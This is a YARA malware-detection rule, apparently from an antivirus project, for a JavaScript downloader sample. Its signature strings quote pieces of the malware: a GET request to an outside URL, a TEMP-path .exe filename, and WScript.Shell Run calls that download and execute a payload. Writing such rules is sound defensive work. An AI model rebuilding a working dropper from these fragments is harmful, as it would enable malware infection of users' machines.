rule sig_20160329_607d401e3342b95eebdd72823cadd371 {
  meta:
    description = "datamaliciousorder - file 20160329_607d401e3342b95eebdd72823cadd371.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "98aa18ee8ab85a91267cc4c29df15796c7ac590515c5216e569dc5bb8a57ddbc"

  strings:
    $s1  = "wm[cz](\"GET\", \"http://blog.insite.pt/m8djs\", false);" fullword ascii
    $s2  = "function sQ() {return m[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"B8X1uKERNIoc.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[bo](vF() * 11); if (wm[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function h(T, yP){Ms = Ms * 1; return T - yP;};" fullword ascii
    $s5  = "var m = function aM() {return WScript[oZ](\"WScript.Shell\");}(), XE = 11;" fullword ascii
    $s6  = "function f(){return \"\" + yA;};" fullword ascii
    $s7  = "function E() {return ((DM == true) && (DM == h0)) ? 1 : Ms;};" fullword ascii
    $s8  = "function g(V0){m[\"Run\"](V0, Ms, Ms);};" fullword ascii
    $s9  = "function Y(Ao) {var w = (1, 2, 3, 4, 5, Ao); return w;};" fullword ascii
    $s10 = "var uP = new this[\"Date\"]();" fullword ascii
    $s11 = "return h(vp, Kd);" fullword ascii
    $s12 = "function LN()" fullword ascii
    $s13 = " while (Qp){" fullword ascii
    $s14 = "function vF(){return 22;};" fullword ascii
    $s15 = "function WH(){return oZ;};" fullword ascii
    $s16 = "var h0 = false;" fullword ascii
    $s17 = "var ft = false;" fullword ascii
    $s18 = "h0 = true; " fullword ascii
    $s19 = "DM = true; " fullword ascii
    $s20 = "var DM = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}